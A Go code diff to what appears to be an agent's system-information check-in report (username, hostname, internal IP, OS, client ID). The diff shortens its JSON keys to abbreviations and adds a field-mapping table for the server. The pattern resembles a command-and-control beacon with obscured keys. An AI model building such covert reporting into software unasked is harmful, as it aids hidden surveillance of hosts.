@@ -21,22 +21,22 @@ import (
 type SystemInfo struct {
 	// Basic process info
 	PID      int    `json:"pid"`
-	ProcName string `json:"process_name"`
+	ProcName string `json:"pn"`
 
 	// System identification
-	Username string `json:"username"`
-	Hostname string `json:"hostname"`
+	Username string `json:"un"`
+	Hostname string `json:"hn"`
 
 	// Network info
-	IP string `json:"internal_ip"`
+	IP string `json:"ip"`
 
 	// System details
-	Architecture string    `json:"architecture"`
+	Architecture string    `json:"ac"`
 	OS           string    `json:"os"`
-	Timestamp    time.Time `json:"timestamp"`
+	Timestamp    time.Time `json:"ts"`
 
 	// Client identification
-	ClientID string `json:"client_id"`
+	ClientID string `json:"cl"`
 
 	// Random seed
 	Seed string `json:"seed"`
@@ -44,9 +44,9 @@ type SystemInfo struct {
 
 // SystemInfoReport represents the complete report structure
 type SystemInfoReport struct {
-	AgentInfo SystemInfo        `json:"agent_info"`
-	Metadata  map[string]string `json:"metadata"`
-	Status    string            `json:"status"`
+	AgentInfo SystemInfo        `json:"ag"`
+	Metadata  map[string]string `json:"md"`
+	Status    string            `json:"st"`
 	Error     string            `json:"error,omitempty"`
 }
 
@@ -207,13 +207,22 @@ func CollectSystemInfo(clientID string) (*SystemInfoReport, error) {
 	// Get architecture
 	info.Architecture = getArchitecture()
 
-	// Create the full report
+	// Create the full report with metadata including JSON field mapping
+	metadata := map[string]string{
+		"startup_time": time.Now().UTC().Format(time.RFC3339),
+	}
+
+	// Add JSON field mapping to metadata so server can decode responses
+	// The mapping is serialized as JSON within the metadata
+	fieldMapping := GetJSONFieldMapping()
+	if fieldMappingJSON, err := json.Marshal(fieldMapping); err == nil {
+		metadata["jfm"] = string(fieldMappingJSON)
+	}
+
 	report := &SystemInfoReport{
 		AgentInfo: *info,
-		Metadata: map[string]string{
-			"startup_time": time.Now().UTC().Format(time.RFC3339),
-		},
-		Status: "active",
+		Metadata:  metadata,
+		Status:    "active",
 	}
 
 	return report, nil
